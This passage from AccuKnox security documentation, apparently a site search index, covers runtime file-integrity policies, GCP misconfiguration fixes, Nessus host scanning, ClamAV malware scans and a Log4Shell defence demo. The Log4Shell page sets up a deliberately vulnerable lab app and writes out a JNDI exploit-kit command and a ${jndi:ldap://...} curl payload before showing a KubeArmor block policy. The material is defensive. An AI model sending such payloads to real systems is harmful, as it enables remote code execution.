true\n       recursive: true\n     - dir: /bin/\n       readOnly: true\n       recursive: true\n     - dir: /boot/\n       readOnly: true\n       recursive: true\n  action: Block\n</code></pre> <ol> <li>Upload and activate the policy.</li> </ol> <p></p> <p></p>"},{"location":"use-cases/vm-file-integrity/#protected-directories","title":"Protected Directories","text":"<ul> <li> <p>System binary folders: <code>/sbin/</code>, <code>/usr/bin/</code>, <code>/usr/lib/</code>, <code>/usr/sbin/</code>, <code>/bin/</code>, <code>/boot/</code></p> </li> <li> <p>All directories are protected in read-only mode with recursive protection applied.</p> </li> </ul>"},{"location":"use-cases/vm-file-integrity/#expected-outcome","title":"Expected Outcome","text":"<ul> <li> <p>Unauthorized write attempts to protected files are blocked.</p> </li> <li> <p>Alerts are triggered and logged in the SaaS platform.</p> </li> </ul>"},{"location":"use-cases/vm-file-integrity/#scenario","title":"Scenario","text":"<p>A malicious script attempts to modify or create a file in <code>/sbin</code>. The write action is blocked, preserving system security, and an alert is sent to the monitoring dashboard.</p>"},{"location":"use-cases/vm-file-integrity/#verification-steps","title":"Verification Steps","text":"<ol> <li> <p>Open a new terminal session on the VM.</p> </li> <li> <p>Attempt to modify a file or create a file in a protected directory.</p> </li> </ol> <p></p> <ol> <li> <p>Confirm:</p> <ul> <li> <p>Write attempt is blocked.</p> </li> <li> <p>Alerts appear on the SaaS platform with details of the action.</p> </li> </ul> </li> </ol> <p></p>"},{"location":"use-cases/vm-gcp/","title":"VM Security Misconfigurations on Google Cloud Platform (GCP)","text":""},{"location":"use-cases/vm-gcp/#iam-security","title":"IAM Security","text":""},{"location":"use-cases/vm-gcp/#common-misconfigurations-in-gcp-iam","title":"Common Misconfigurations in GCP IAM","text":"<p>Service Account Admin: Global Service accounts with overly broad permissions (admin or owner roles) pose significant security risks. These accounts may have more privileges than required for their purpose, making them prime targets for attackers. Misconfigured service accounts can be exploited to escalate privileges, manipulate resources, or exfiltrate sensitive data.</p>"},{"location":"use-cases/vm-gcp/#why-excessive-permissions-in-iam-and-service-accounts-are-a-risk","title":"Why Excessive Permissions in IAM and Service Accounts Are a Risk","text":"<p>Excessive IAM permissions and improperly configured service accounts can lead to:</p> <ul> <li> <p>Unauthorized Access: Service accounts with admin, owner, or write permissions can be exploited by attackers to gain control over GCP resources.</p> </li> <li> <p>Privilege Escalation: Misconfigured IAM roles can allow attackers to escalate privileges within the environment, gaining broader access to critical resources.</p> </li> <li> <p>Resource Misuse: Compromised service accounts can manipulate, delete, or steal sensitive data and resources, leading to operational disruptions.</p> </li> <li> <p>Compliance Violations: Excessive permissions can result in violations of frameworks such as GDPR, HIPAA, or ISO, leading to legal and financial penalties.</p> </li> </ul>"},{"location":"use-cases/vm-gcp/#attack-scenario","title":"Attack Scenario","text":"<p>An attacker identifies a service account with admin privileges, either through direct access or exploiting weak security practices like weak credentials or lack of MFA. The attacker uses these privileges to escalate access, modify GCP configurations, or exfiltrate sensitive data.</p>"},{"location":"use-cases/vm-gcp/#how-to-identify-and-remediate-excessive-permissions-with-accuknox","title":"How to Identify and Remediate Excessive Permissions with AccuKnox","text":"<ol> <li> <p>Navigate to Findings: Go to the AccuKnox portal and access Issues &gt; Findings.</p> </li> <li> <p>Filter Results: Use the cloud findings filter and search for \"service account\" to identify misconfigured service accounts.</p> </li> <li> <p>Review Findings: Analyze the identified findings to assess the risk associated with excessive permissions in service accounts that are not restricted properly.</p> </li> </ol> <p></p>"},{"location":"use-cases/vm-gcp/#remediation-steps-for-service-account-admin","title":"Remediation Steps for Service Account Admin","text":"<ol> <li> <p>Identify the Finding:    Locate the findings related to misconfigured service accounts with excessive permissions (e.g., Service Account Admin).</p> </li> <li> <p>Create a Ticket:    Create a ticket to track the remediation process and ensure visibility of the issue.</p> </li> <li> <p>Follow Remediation Guidance:</p> </li> <li> <p>Service Account Admin:      Remove unnecessary admin, owner, or write privileges from service accounts. Apply the principle of least privilege to limit access only to the necessary resources.</p> </li> <li> <p>Verify Resolution:      Confirm that the issue has been remediated by reviewing updated IAM roles, service account configurations in the AccuKnox portal.</p> </li> </ol> <p></p>"},{"location":"use-cases/vm-gcp/#best-practices-for-gcp-iam-security","title":"Best Practices for GCP IAM Security","text":"<ul> <li> <p>Apply Least Privilege:   Always ensure that service accounts and IAM roles are granted the minimum permissions required for their tasks. Avoid granting admin or owner roles unless absolutely necessary.</p> </li> <li> <p>Regularly Audit IAM Roles and Service Accounts:   Continuously review and audit IAM roles and permissions to ensure compliance with the principle of least privilege. Regularly check service account configurations to ensure they have appropriate, minimal access.</p> </li> <li> <p>Monitor IAM Security Continuously:   Use AccuKnox CSPM to continuously monitor IAM configurations and detect any misconfigurations, excessive permissions, or unauthorized access attempts.</p> </li> <li> <p>Enable Multi-Factor Authentication (MFA):   Enable MFA for all IAM users and service accounts with access to critical resources to add an extra layer of protection.</p> </li> </ul> <p>By proactively managing IAM configurations, limiting permissions, and applying security best practices, organizations can significantly reduce the risks associated with misconfigured IAM roles and service accounts in GCP, ensuring a secure and compliant cloud environment.</p>"},{"location":"use-cases/vm-gcp/#network-security","title":"Network Security","text":"<p>Common Network Misconfigurations in GCP</p>"},{"location":"use-cases/vm-gcp/#all-ports-open-to-the-public","title":"All Ports Open to the Public","text":"<p>Allowing all ports to be open to the public creates an attack surface that hackers can exploit. Restricting access to only necessary ports, and ensuring that unused ports are closed or restricted, minimizes exposure and reduces the risk of attacks.</p>"},{"location":"use-cases/vm-gcp/#why-these-network-misconfigurations-are-a-risk","title":"Why These Network Misconfigurations Are a Risk","text":"<ul> <li> <p>Unauthorized Access: Unrestricted SSH access or open ports allow attackers to exploit vulnerabilities, potentially gaining control over your instances.</p> </li> <li> <p>Data Exfiltration or Malicious Use: Public-facing open ports can be targeted for attacks such as DDoS, data theft, or data interception.</p> </li> <li> <p>Compliance Violations: Exposing sensitive services to the public internet can violate data protection regulations like GDPR, HIPAA, or ISO standards, leading to penalties.</p> </li> </ul>"},{"location":"use-cases/vm-gcp/#attack-scenario_1","title":"Attack Scenario","text":"<p>Open Ports Vulnerability: All ports are open to the public, allowing an attacker to probe the environment and exploit exposed services. The attacker could target vulnerable services running on unused ports, gaining unauthorized access to sensitive resources.</p>"},{"location":"use-cases/vm-gcp/#how-to-identify-and-remediate-network-misconfigurations-with-accuknox","title":"How to Identify and Remediate Network Misconfigurations with AccuKnox","text":"<ol> <li> <p>Navigate to Findings: Go to the AccuKnox portal and access Issues &gt; Findings.</p> </li> <li> <p>Filter Results: Use the cloud findings filter and search for keywords like port 80, or open ports to identify instances with misconfigurations.</p> </li> <li> <p>Review Findings: Analyze the identified findings related to open ports, and SSH misconfigurations. Assess the risk associated with each finding.</p> </li> </ol> <p></p>"},{"location":"use-cases/vm-gcp/#remediation-steps-for-network-security-issues","title":"Remediation Steps for Network Security Issues","text":"<ol> <li> <p>Identify the Finding:    Locate the findings related to publicly exposed open ports.</p> </li> <li> <p>Create a Ticket:    Create a ticket to track the remediation process and assign the appropriate team for resolution.</p> </li> <li> <p>Follow Remediation Guidance:</p> </li> <li> <p>All Ports Open to the Public:      Restrict unnecessary ports, allowing access only from specific, trusted IP addresses or networks. Review the firewall and network access control lists (ACLs) regularly.</p> </li> <li> <p>Verify Resolution:    Confirm that the misconfigurations have been remediated by reviewing updated firewall rules and network configurations access settings.</p> </li> </ol> <p></p>"},{"location":"use-cases/vm-gcp/#best-practices-for-gcp-network-security","title":"Best Practices for GCP Network Security","text":"<ul> <li> <p>Limit Public Access to Critical Ports:   Restrict access to sensitive ports to known IP addresses or trusted networks. Ensure that only necessary services are exposed to the internet.</p> </li> <li> <p>Use Firewalls and ACLs:   Continuously configure and audit firewall rules and network access control lists (ACLs) to block unnecessary ports and limit access based on IP address or range.</p> </li> <li> <p>Monitor Network Security Continuously:   Use AccuKnox CSPM to monitor your network security continuously for any misconfigurations or unauthorized access attempts, ensuring timely remediation.</p> </li> <li> <p>Implement Zero Trust Networking:   Adopt a zero-trust model for your network by verifying every connection, ensuring that only authenticated and authorized users or devices can access resources.</p> </li> </ul>"},{"location":"use-cases/vm-gcp/#project-level-ssh-for-vm","title":"Project level SSH for VM","text":"<p>A common security misconfiguration in Google Cloud Platform (GCP) environments is enabling project-wide SSH keys. This practice allows SSH access to all instances within a project using the same keys, which increases the risk of unauthorized access and reduces control over access management. Disabling project-wide SSH keys in favor of instance-specific keys or IAM-based access is essential for secure operations.</p>"},{"location":"use-cases/vm-gcp/#why-project-wide-ssh-keys-are-a-risk","title":"Why Project-Wide SSH Keys are a Risk","text":"<p>Project-wide SSH keys introduce several risks:</p> <ul> <li> <p>Unauthorized Access: If a project-wide key is compromised, an attacker gains access to all instances in the project.</p> </li> <li> <p>Reduced Accountability: Using the same key across multiple instances makes it challenging to trace access back to individual users.</p> </li> <li> <p>Compliance Violations: Many compliance standards require granular control and auditing of access, which is undermined by project-wide SSH keys.</p> </li> </ul>"},{"location":"use-cases/vm-gcp/#attack-scenario_2","title":"Attack Scenario","text":"<p>An attacker obtains a project-wide SSH private key due to weak key management practices. With the compromised key, they gain access to all virtual machines (VMs) in the project. This access allows the attacker to exfiltrate data, deploy malware, or disrupt operations across multiple instances simultaneously.</p> <p></p>"},{"location":"use-cases/vm-gcp/#how-to-identify-and-remediate-project-wide-ssh-keys-with-accuknox","title":"How to Identify and Remediate Project-Wide SSH Keys with AccuKnox","text":"<ol> <li> <p>Navigate to Findings: Access the AccuKnox portal and go to Issues &gt; Findings.</p> </li> <li> <p>Apply Filters: Use the GCP findings filter and search for the keyword <code>SSH keys</code> to identify non-compliant configurations.</p> </li> <li> <p>Review Findings: Examine the findings to locate projects where project-wide SSH keys are enabled.</p> </li> <li> <p>Take Action: Follow the remediation guidance provided in the platform to disable project-wide SSH keys.</p> </li> </ol>"},{"location":"use-cases/vm-gcp/#detailed-remediation-steps","title":"Detailed Remediation Steps","text":"<ol> <li>Identify Affected Projects: Use the GCP console or CLI to check for projects with SSH keys enabled.</li> </ol> <p><code>gcloud compute project-info describe --project=&lt;project-id&gt;</code></p> <p>Look for <code>commonInstanceMetadata</code> and verify if the <code>ssh-keys</code> metadata field is present.</p> <ol> <li>Remove Project-Wide SSH Keys:</li> </ol> <p><code>gcloud compute project-info remove-metadata --project=&lt;project-id&gt; --keys=ssh-keys</code></p> <ol> <li>Implement Instance-Specific Keys: Configure SSH keys at the instance level to limit access scope.</li> </ol> <p><code>gcloud compute instances add-metadata &lt;instance-name&gt; --metadata ssh-keys=\"&lt;username&gt;:&lt;public-key&gt;\"</code></p> <ol> <li>Adopt IAM-Based Access: Use IAM roles and OS Login to manage SSH access securely.</li> </ol> <p><code>gcloud compute project-info add-metadata --metadata enable-oslogin=TRUE</code></p> <p></p>"},{"location":"use-cases/vm-gcp/#best-practices-to-avoid-project-wide-ssh-key-risks","title":"Best Practices to Avoid Project-Wide SSH Key Risks","text":"<ul> <li> <p>Disable Project-Wide SSH Keys: Always disable project-wide SSH keys and use instance-specific configurations.</p> </li> <li> <p>Enable OS Login: Use IAM-based OS Login for centralized and auditable SSH access management.</p> </li> <li> <p>Enforce Strong Key Management: Regularly rotate SSH keys and ensure they meet length and complexity requirements.</p> </li> <li> <p>Continuous Monitoring: Use AccuKnox CSPM to detect and remediate misconfigurations in real-time.</p> </li> <li> <p>Audit Access Regularly: Periodically review and audit SSH key configurations and access policies.</p> </li> </ul> <p>By eliminating project-wide SSH keys and following best practices, you can significantly reduce the attack surface and enhance the security of your GCP environment.</p>"},{"location":"use-cases/vm-gcp/#storage-security","title":"Storage Security","text":"<p>A frequent misconfiguration in GCP environments is the presence of unused compute disks. These unattached or orphaned disks often go unnoticed, resulting in unnecessary costs and potential security risks. Managing and cleaning up unused compute disks is crucial for cost optimization and ensuring data security.</p>"},{"location":"use-cases/vm-gcp/#why-unused-compute-disks-are-a-risk","title":"Why Unused Compute Disks are a Risk","text":"<p>Unused compute disks pose several risks:</p> <ul> <li> <p>Increased Costs: Unattached disks continue to incur storage charges, contributing to unnecessary cloud spending.</p> </li> <li> <p>Data Breaches: Orphaned disks may contain sensitive data that can be accessed if not securely deleted.</p> </li> <li> <p>Operational Overhead: Accumulation of unused resources complicates resource management and auditing.</p> </li> </ul>"},{"location":"use-cases/vm-gcp/#attack-scenario_3","title":"Attack Scenario","text":"<p>An organization forgets to delete disks after decommissioning several virtual machines (VMs). An attacker with access to the cloud account identifies these unattached disks, mounts them to their own instances, and extracts sensitive data, leading to a data breach.</p> <p></p>"},{"location":"use-cases/vm-gcp/#how-to-identify-and-remediate-unused-compute-disks-with-accuknox","title":"How to Identify and Remediate Unused Compute Disks with AccuKnox","text":"<ol> <li> <p>Navigate to Findings: Access the AccuKnox portal and go to Issues &gt; Findings.</p> </li> <li> <p>Apply Filters: Use the cloud findings filter and search for the keyword <code>orphaned disks</code> to locate unused disks.</p> </li> <li> <p>Review Findings: Assess the details of identified disks, including their creation date, last attached instance, and associated cost.</p> </li> <li> <p>Take Action: Follow the remediation guidance in the platform to delete or repurpose unused compute disks.</p> </li> </ol>"},{"location":"use-cases/vm-gcp/#detailed-remediation-steps_1","title":"Detailed Remediation Steps","text":"<ol> <li>List Unattached Disks: Use GCP's CLI to list unattached disks:</li> </ol> <p><code>gcloud compute disks list --filter=\"users=[]\"</code></p> <ol> <li> <p>Evaluate Disk Usage: Review each unattached disk to determine if it contains critical data.</p> </li> <li> <p>Backup Important Data: If necessary, create snapshots of the disks before deletion for backup purposes.</p> </li> <li> <p>Delete Unused Disks:</p> </li> </ol> <p><code>gcloud compute disks delete &lt;disk-name&gt;</code></p> <ol> <li>Implement Policies for Disk Management: Use labels to track disk ownership and automate cleanup processes.</li> </ol>"},{"location":"use-cases/vm-gcp/#best-practices-to-avoid-unused-compute-disk-risks","title":"Best Practices to Avoid Unused Compute Disk Risks","text":"<ul> <li> <p>Automate Disk Cleanup: Implement scripts or tools to identify and delete unattached disks periodically.</p> </li> <li> <p>Enable Alerts: Use GCP Monitoring to notify you of unattached disks.</p> </li> <li> <p>Tag Resources: Apply consistent labels to all resources for better tracking and management.</p> </li> <li> <p>Regular Audits: Periodically review disk usage and remove unused resources.</p> </li> <li> <p>Implement Policies: Use GCP Policy Analyzer to enforce rules for disk management.</p> </li> </ul> <p>By proactively identifying and managing unused compute disks, organizations can optimize cloud costs, reduce security risks, and maintain a streamlined resource inventory.</p>"},{"location":"use-cases/vm-host-scan-report/","title":"Generate Host Vulnerability Report","text":"<p>AccuKnox's latest feature update provides new custom reporting feature capabilities that can help users get the reports customized as per their requirements.</p> <p>Info</p> <p>To enable this feature, customers must inform the AccuKnox Support team (support@accuknox.com) regarding their requirements. The Support team will configure the report template from the backend, enabling users to generate on-demand or scheduled reports.</p> <p>To generate an on-demand or scheduled report, users must follow the steps below for the Host Vulnerability Report.</p>"},{"location":"use-cases/vm-host-scan-report/#accessing-the-host-vulnerability-report","title":"Accessing the Host Vulnerability Report","text":"<ol> <li> <p>Navigate to the Reports section from the sidebar.</p> </li> <li> <p>Go to the Custom tab.</p> </li> </ol> <p></p> <ol> <li>Select the Host Vulnerability Report option.</li> </ol> <p></p>"},{"location":"use-cases/vm-host-scan-report/#report-generation-options","title":"Report Generation Options","text":"<p>Users can generate reports in two ways:</p> <ol> <li> <p>On-Demand Reports</p> </li> <li> <p>Scheduled Reports</p> </li> </ol> <p></p>"},{"location":"use-cases/vm-host-scan-report/#on-demand-report-generation","title":"On-Demand Report Generation","text":"<p>Steps to Generate an On-Demand Report:</p> <ol> <li> <p>Configure the report by filling in the following details:</p> <ul> <li> <p>Name: Provide a name for the report.</p> </li> <li> <p>Report Name: Enter the specific report name.</p> </li> <li> <p>Email: Provide the email address to which the report should be sent.</p> </li> <li> <p>Description: Add a description of the report.</p> </li> <li> <p>Date Range: Choose a predefined date range (e.g., \"Last 2 days\").</p> </li> </ul> </li> <li> <p>Click Save to finalize the configuration.</p> </li> </ol> <p></p> <ol> <li>Once saved, the report will appear in the UI with a progress state indicator.</li> </ol> <p></p> <ol> <li> <p>After the report generation is completed:</p> <ul> <li> <p>The Generate option will appear in the UI.</p> </li> <li> <p>The report will also be sent to the specified email address.</p> </li> <li> <p>To view the report in the UI, click on Generate Report.</p> </li> </ul> </li> </ol> <p></p>"},{"location":"use-cases/vm-host-scan-report/#scheduled-report-configuration","title":"Scheduled Report Configuration","text":"<p>Steps to Schedule a Report:</p> <ol> <li> <p>Configure the scheduled report by filling in the following details:</p> <ul> <li> <p>Name: Provide a name for the report.</p> </li> <li> <p>Report Name: Enter the specific report name.</p> </li> <li> <p>Email: Provide the email address to which the report should be sent. You can include multiple addresses if needed.</p> </li> <li> <p>Description: Add a description of the report.</p> </li> <li> <p>Date Range: Choose a predefined date range (e.g., \"Last 2 days\").</p> </li> <li> <p>Frequency: Select the scheduling frequency. Options include:</p> <ul> <li> <p>Daily: Receive the report every day at a configured time.</p> </li> <li> <p>Weekly: Schedule the report to generate on a specific day of the week.</p> </li> <li> <p>Monthly: Configure the report to generate on the 1<sup>st</sup> of each month (user-defined dates will be supported soon).</p> </li> </ul> </li> <li> <p>Select Time: Specify the exact time for the report generation.</p> </li> </ul> </li> <li> <p>Click Save to finalize the configuration.</p> </li> </ol> <p></p> <ol> <li>Once saved, the report will appear in the UI with a progress state indicator.</li> </ol> <p></p> <ol> <li> <p>After the report generation is completed:</p> <ul> <li> <p>The View option will appear in the UI.</p> </li> <li> <p>The report will also be sent to the specified email address.</p> </li> <li> <p>To view the report in the UI, click on View.</p> </li> </ul> </li> </ol>"},{"location":"use-cases/vm-host-scan-report/#additional-information","title":"Additional Information","text":"<p>For more details on custom reports, refer to the guide: How to Configure Custom Reports and Summarized Custom Report</p>"},{"location":"use-cases/vm-host-scan/","title":"Running Host Security Scans with AccuKnox Tooling","text":"<p>AccuKnox provides host scanning capabilities through an integration with tools like Nessus</p> <p>Nessus is a remote security scanning tool for vulnerability scanning by Tenable. IT Administration teams are using it to scan for vulnerabilities in the workstations and servers, routers, and switches which are planted all over the network both in LAN as well as WAN. It is also leveraged by professionals for Penetration Testing and compliance.</p> <p>Nessus is a very advanced tool for mainly highlighting the server's configuration level, software level issues, and missing security patches. For network devices, it lists any configuration issues, outdated practices, or patches required for improving security.</p> <p>By integrating Nessus with AccuKnox, the following additional security capabilities are unlocked:</p> <ul> <li> <p>Asset discovery of On-Prem Hosts And Network Devices</p> </li> <li> <p>Penetration Testing Reconnaissance</p> </li> <li> <p>Active Directory (AD) Checks</p> </li> <li> <p>Unsupported OS and Third-Party Software reports</p> </li> <li> <p>Network Infrastructure and Database Configuration Audits</p> </li> <li> <p>External Attack Surface Discovery</p> </li> <li> <p>Malware Scan</p> </li> <li> <p>Automation and Remediation</p> </li> <li> <p>Alerting and Reporting</p> </li> </ul> <p>Thus, the integration allows AccuKnox to perform a deep scan of the On-Prem environment and provide a richer risk assessment, both for the Hosts and the Network infrastructure. This integrates seamlessly into the platform along with the findings that AccuKnox provides out of the box for the Cloud Accounts and Workloads.</p> <p>Pre-requisite for Integration: Host Scan -</p>"},{"location":"use-cases/vm-host-scan/#use-cases","title":"Use-Cases","text":""},{"location":"use-cases/vm-host-scan/#apache-log4j","title":"Apache Log4j","text":"<p>The\u00a0CVE-2021-44228 RCE vulnerability - affecting Apache's Log4j library, versions 2.0-beta9 to 2.14.1 - exists in the action the Java Naming and Directory Interface (JNDI) takes to resolve variables. According to the\u00a0CVE-2021-44228 listing, affected versions of Log4j contain JNDI features - such as message lookup substitution - that \"do not protect against adversary-controlled LDAP [Lightweight Directory Access Protocol] and other JNDI related endpoints.\"</p> <p>note</p> <p>The Apache\u00a0Log4j version 2.16.0 security update\u00a0that addresses the\u00a0CVE-2021-45046\u00a0vulnerability disables JNDI.</p>"},{"location":"use-cases/vm-host-scan/#impact","title":"Impact","text":"<p>An adversary can exploit CVE-2021-44228 by submitting a specially crafted request to a vulnerable system that causes that system to execute arbitrary code. The request allows the adversary to take full control over the system. The adversary can then steal information, launch ransomware, or conduct other malicious activity.</p> <p>AccuKnox Host Scan detects critical vulnerabilities like Apache Log4j and provides remediation steps to remediate the critical findings</p> <p></p>"},{"location":"use-cases/vm-host-scan/#solution","title":"Solution","text":"<p>Upgrading the package to the latest supported version will remediate the vulnerability</p> <p></p>"},{"location":"use-cases/vm-host-scan/#microsoft-rdp-rce-cve-2019-0708","title":"Microsoft RDP RCE (CVE-2019-0708)","text":"<p>A remote code execution vulnerability exists in Remote Desktop Services -- formerly known as Terminal Services -- when an unauthenticated attacker connects to the target system using RDP and sends specially crafted requests. This vulnerability is pre-authentication and requires no user interaction. An attacker who successfully exploited this vulnerability could execute arbitrary code on the target system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.</p> <p>To exploit this vulnerability, an attacker would need to send a specially crafted request to the target systems Remote Desktop Service via RDP.</p>"},{"location":"use-cases/vm-host-scan/#impact_1","title":"Impact","text":"<p>The remote host is affected by a remote code execution vulnerability in Remote Desktop Protocol (RDP). An unauthenticated, remote attacker can exploit this, via a series of specially crafted requests, to execute arbitrary code.</p> <p>AccuKnox Detects the Microsoft RDP RCE and provides descriptive solutions to help organizations patch the critical vulnerability</p> <p></p>"},{"location":"use-cases/vm-host-scan/#solution_1","title":"Solution","text":"<p>Microsoft has released a set of patches for OS having CVE-2019-0708, Installing the security patch will remediate the vulnerability.</p> <p></p>"},{"location":"use-cases/vm-host-scan/#ms11-020-vulnerability-in-smb-server","title":"MS11-020: Vulnerability in SMB Server","text":"<p>The remote host is affected by a vulnerability in the SMB server that may allow an attacker to execute arbitrary code or perform a denial of service against the remote host. This vulnerability depends on access to a Windows file share but does not necessarily require credentials.</p>"},{"location":"use-cases/vm-host-scan/#impact_2","title":"Impact","text":"<p>It is possible to execute arbitrary code on the remote Windows host due to flaws in its SMB implementation.</p> <p>AccuKnox scans the host to identify vulnerabilities related to outdated components, packages, operating systems, file systems, and more. It also provides detailed remediation steps to address these security issues effectively.</p> <p></p>"},{"location":"use-cases/vm-host-scan/#solution_2","title":"Solution","text":"<p>Microsoft has released the security patches which need to be installed to remediate the security issues</p> <p>To remediate this:</p> <p>Users can create tickets from AccuKnox Saas UI with the required details of the findings</p> <p></p>"},{"location":"use-cases/vm-log4shell/","title":"Defending Against Log4Shell","text":"<p>The Log4Shell vulnerability (CVE-2021-44228) has demonstrated the critical need for robust runtime security in modern IT infrastructures. Attackers exploit this vulnerability by injecting malicious code via the vulnerable Log4j library, often leading to unauthorized system access. Here, we will show how to secure your virtual machines (VMs) against such attacks using AccuKnox Runtime Security and KubeArmor.</p>"},{"location":"use-cases/vm-log4shell/#setting-the-stage-the-attack-environment","title":"Setting the Stage: The Attack Environment","text":"<p>Log4Shell leverages the JNDI lookup functionality in vulnerable Log4j versions. Attackers can trigger remote code execution by simply injecting a malicious payload into log messages.</p>"},{"location":"use-cases/vm-log4shell/#the-victim-a-vulnerable-web-server","title":"The Victim: A Vulnerable Web Server","text":"<p>The environment requires Java 1.8.0_181 or a compatible version to simulate the attack.</p> <p></p> <p>Begin by cloning the vulnerable application repository from GitHub. This repository contains a Log4j-vulnerable application designed for testing.</p> <p><code>git clone https://github.com/christophetd/log4shell-vulnerable-app &amp;&amp; cd log4shell-vulnerable-app</code></p> <p>After cloning the repository, navigate to the directory and build the application using Gradle. The command <code>./gradlew bootJar --no-daemon</code> compiles the application and prepares it for execution.</p> <p></p> <p>Once the build process completes, navigate to the <code>build/libs</code> directory and launch the application using Java. At this point, the application runs locally, simulating a system with the Log4Shell vulnerability.</p> <p><code>/opt/jdk/jdk1.8.0_181/bin/java -jar ./log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar</code></p> <p></p>"},{"location":"use-cases/vm-log4shell/#attack-scenario","title":"Attack Scenario","text":"<p>The Log4Shell exploit allows attackers to manipulate vulnerable systems by injecting malicious payloads into application logs. The injected payload triggers a JNDI lookup, fetching an attacker-controlled resource and executing unauthorized code.</p> <p>For example, an attacker might craft a payload using a JNDI exploit kit:</p> <p><code>java -jar JNDI-Exploit-Kit.jar -L localhost:1389 -C \"curl http://localhost:9001\"</code></p> <p></p> <p>Prepare the HTTP server for reverse connection</p> <p><code>docker run --rm -p 9001:9001 hashicorp/http-echo -listen=:9001 -text=\"hello\"</code></p> <p>This payload exploits the vulnerability, allowing the attacker to execute commands such as <code>curl</code>.</p> <p><code>curl http://172.16.250.140:8080/ -H 'X-Api-Version: ${jndi:ldap://172.16.250.141:1389/gog049}'</code></p> <p>As shown in the screenshot below, we observed the following, confirming the successful exploitation of Log4Shell:</p> <ul> <li> <p>LDAP server hit: Indicates the vulnerable application initiated the JNDI lookup as instructed by the payload.</p> </li> <li> <p>HTTP request: Confirms the application executed the payload, triggering an HTTP request via the <code>curl</code> command.</p> </li> </ul> <p></p> <p></p> <p></p>"},{"location":"use-cases/vm-log4shell/#securing-against-log4shell-exploits-with-accuknox-runtime-security","title":"Securing Against Log4Shell Exploits with AccuKnox Runtime Security","text":"<p>AccuKnox Runtime Security offers real-time protection to defend against unauthorized or malicious activities by enforcing precise security policies within your environment. By leveraging AccuKnox's policy-driven approach, organizations can effectively block exploitation attempts like Log4Shell and safeguard sensitive assets from unauthorized access.</p> <p>Let's walk through the steps to protect VMs from such attacks using AccuKnox Runtime Security:</p> <p>Ensure AccuKnox Runtime Security is Configured: For virtual machines (VMs) environments, you can onboard them to the AccuKnox platform to extend runtime security capabilities. Follow the instructions provided in the official documentation: Onboarding and Deboarding VMs with Systemd. By onboarding your VMs, you enable AccuKnox to monitor and protect workloads hosted on them, ensuring a comprehensive security posture.</p> <p></p> <p></p> <p>Navigate to Policies: In the AccuKnox dashboard, access the Policies section under the Runtime Security tab. This is where you can define and enforce security rules to block exploitation attempts like the Log4Shell vulnerability.</p> <p></p> <p>Apply Policies to Block Exploits: Deploy relevant KubeArmor policies to restrict malicious behavior. For example, you can block unauthorized execution commands or access to sensitive resources by applying the following policy:</p> <p></p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nPolicymetadata:\n  name: disallow-exec\nspec:\n  severity: 1\n  message: \"disallow unwanted execings\"\n  nodeSelector:\n    matchLabels:\n      kubearmor.io/hostname: \"*\"\n  process:\n    matchPaths:\n    - path: /usr/bin/apt\n    - path: /usr/bin/apt-get\n    - path: /bin/apt\n    - path: /bin/apt-get\n    - path: /usr/bin/dpkg\n    - path: /bin/dpkg\n    - path: /usr/bin/gdebi\n    - path: /bin/gdebi\n    - path: /usr/bin/make\n    - path: /bin/make\n    - path: /usr/bin/yum\n    - path: /bin/yum\n    - path: /usr/bin/rpm\n    - path: /bin/rpm\n    - path: /usr/bin/dnf\n    - path: /bin/dnf\n    - path: /usr/bin/pacman\n    - path: /usr/sbin/pacman\n    - path: /bin/pacman\n    - path: /sbin/pacman\n    - path: /usr/bin/makepkg\n    - path: /usr/sbin/makepkg\n    - path: /bin/makepkg\n    - path: /sbin/makepkg\n    - path: /usr/bin/yaourt\n    - path: /usr/sbin/yaourt\n    - path: /bin/yaourt\n    - path: /sbin/yaourt\n    - path: /usr/bin/zypper\n    - path: /bin/zypper\n    - path: /usr/bin/curl\n  action: Block\nmetadata:\n  name: disallow-exec\n</code></pre> <p>This policy ensures that malicious commands such as <code>curl</code> or <code>apt</code>, commonly used during exploitation attempts, are effectively blocked.</p> <p>After enforcing the policy, AccuKnox Runtime Security triggers an alert if there are any violations. This alert provides detailed insights into the blocked exploit attempt, including information about the source of the malicious request, enabling you to monitor and respond to threats in real-time effectively</p> <p></p> <p></p>"},{"location":"use-cases/vm-malware-scan/","title":"Malware Scan","text":"<p>AccuKnox integrates with ClamAV to extend the host scanning capabilities to Windows/Linux machines.</p> <p>ClamAV is an Open-source antivirus engine developed by Cisco, for detecting malware, viruses, trojans, and other security threats, specially designed for e-mail scanning on mail gateways.</p>"},{"location":"use-cases/vm-malware-scan/#usecases","title":"UseCases","text":""},{"location":"use-cases/vm-malware-scan/#quick-scan","title":"Quick scan","text":"<p>ClamAV is optimized to scan files. Scans can be triggered on multiple files or directories by using the include/exclude option. Users can see the scan results in the SaaS and quarantine or delete the infected files.</p> <p>In the example below, the scan ran against the URL (https://secure.eicar.org/eicar.com.txt), which was a malicious text file. ClamAV detected and raised it in the scan results with the matched virus signature as cmdown below.</p> <pre><code>$ curl https://secure.eicar.org/eicar.com.txt | clamscan -\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100    68  100    68    0     0     11      0  0:00:06  0:00:05  0:00:01    141.78M/8.71M sigs                 ]    1.77M/8.71M sigs    0.00K/8.71M sigs\nLoading:    13s, ETA:   0s [========================&gt;]    8.69M/8.69M sigs\nCompiling:   4s, ETA:   0s [========================&gt;]       41/41 tasks\nstdin: Win.Test.EICAR_HDB-1 FOUND\n----------- SCAN SUMMARY -----------\nKnown viruses: 8693157\nEngine version: 1.2.1\nScanned directories: 0\nScanned files: 1\nInfected files: 1\nData scanned: 0.00 MB\nData read: 0.00 MB (ratio 0.00:1)\nTime: 18.313 sec (0 m 18 s)\nStart Date: 2024:05:17 15:42:09\nEnd Date:   2024:05:17 15:42:27\n</code></pre> <p>The CVD (ClamAV Virus Database) files are a collection of signatures, actively maintained by the Cisco Talos team. A digitally signed container that wraps the signatures to ensure no malicious third party can modify it. The SaaS integration can run scans against 8M+ trusted signatures.</p>"},{"location":"use-cases/vm-malware-scan/#real-time-protection-for-linux","title":"Real-time protection for Linux","text":"<p>The <code>ClamOnAcc</code> client utilizes the <code>ClamD</code> daemon to provide on-access scanning. This includes preventing access to a file until it has been scanned.</p>"},{"location":"use-cases/vm-malware-scan/#protect-against-archive-bombs","title":"Protect against archive bombs","text":"<p>A malicious archive file can disable a system or a program while unpacked. Archive bombs consume too much CPU and memory and excessively load the system.</p> <p>The 